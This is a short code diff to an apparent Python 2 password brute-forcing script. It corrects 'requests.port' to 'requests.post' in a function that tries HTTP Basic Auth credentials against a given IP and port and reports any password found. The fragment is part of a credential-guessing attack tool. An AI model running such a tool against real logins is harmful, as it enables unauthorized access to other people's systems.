@@ -19,7 +19,7 @@ def check_resp(stream):# check if we are redirected back to the login prompt.
 def guess(password,username,ip,port):
 	#print '[*] trying password ....%s....'%password
 	encoded=base64.b64encode('%s:%s'%(username,password))
-	req=requests.port('http://%s/:%s'%(ip,port),headers={'Authorization':'Basic %s'%encoded})
+	req=requests.post('http://%s/:%s'%(ip,port),headers={'Authorization':'Basic %s'%encoded})
 	if check_resp(req):
 		print '[+] Found Password!!!:::::===> %s'%password
 		sys.exit()
